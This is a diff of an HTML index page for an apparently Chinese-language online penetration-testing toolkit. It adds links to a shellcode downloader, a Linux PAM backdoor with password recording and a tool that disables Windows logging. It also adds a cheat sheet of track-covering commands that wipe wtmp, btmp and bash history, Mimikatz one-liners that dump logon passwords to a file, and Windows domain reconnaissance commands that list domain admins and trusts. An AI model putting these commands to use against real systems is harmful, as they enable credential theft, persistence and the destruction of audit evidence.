@@ -2,14 +2,49 @@
 	<title>Web Tools</title>
 </head>
 <body>
-	<h1>BIE 的web工具箱</h1>
-	不要吐槽前端不要吐槽前端不要吐槽前端
+	<h1>Cirno.me 在线渗透工具箱</h1>
+	不要吐槽前端不要吐槽前端不要吐槽前端，顺带欢迎各位添加功能
 	<h2>工具列表</h2>
 	<ul>
 	  <li><a href="exe2shellcode.html">exe2shellcode - 把EXE转成shellcode（实际上是下载者）的工具</a></li>
 	  <li><a href="avcheck.html">杀软检测 - 根据进程名判断安装的杀软</a></li>
 	  <li>提权辅助工具包 - 根据systeminfo查询可用提权exp</li>
-	  <li>等待添加</li>
+	  <li><a href="https://github.com/9bie/linux-pam-backdoor">Linux - PAM后门以及密码记录</a></li>
+	  <li><a href="killlog.html">永久关闭windows日志记录</a></li>
 	</ul>
-	Blog: <a href="https://9bie.org">https://9bie.org</a>
+	<div align="right">
+		Made By 9BIE<br>
+		Blog: <a href="https://9bie.org">https://9bie.org</a><br>
+		Web Tools: <a href="https://cirno.me/">https://cirno.me/</a>  
+	</div>
+	<h1>快速手册</h1>
+	<h2>linux 擦屁股</h2>
+	清空last登录<br>
+		echo > /var/log/wtmp<br>
+	清空lastb<br>
+		echo > /var/log/btmp<br>
+	清空bash记录<br>
+		echo > ./.bash_history<br>
+	centos关闭mail发送日志<br>
+		echo "unset MAILCHECK">> /etc/profile<br>
+	<h1>Mimikatz 非交互式</h1>
+	打印（输出）mimikatz执行过程的log : mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full"" exit && dir <br>
+	读取的密码导出在mimikatz的目录输出到文本 : mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit >> log.txt<br>
+	<h1>域信息收集</h1>
+	查询当前登录域：net session<br>
+	当前计算机设置的域：net config workstation<br>
+	判断主域，主域服务器都做时间服务器：net time /domain<br>
+	不用扫描器的情况下一条命令：for /l %i in (1,1,255) do @ping 192.168.200.%i -w 1 -n 1 | find /i"ttl"<br>
+	查询同域下的主机：net view /domain<br>
+	查DC共享：net view \\DC的机器名字<br>
+	查询指定域用户信息：nser user  /domain<br>
+	查询域用户组：net localgroup /domain<br>
+	查询指定域用户组：net group 组名 /domain<br>
+	查看域管理员组：net group "domain admins" /domain<br>
+	获得企业管理员列表：net group "enterprise admins" /domain<br>
+	列出域内的机子：net group "domain computers" /domain<br>
+	登录本机的域管理员： net localgroup administrators /domain<br>
+	获取域信任信息：nltest /domain_trusts<br>
+	查看域密码策略：net accounts /domain<br>
+	获取最近mstsc登录的记录：reg query "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\TERMINAL SERVERCLIENT\DEFAULT"<br>
 </body>
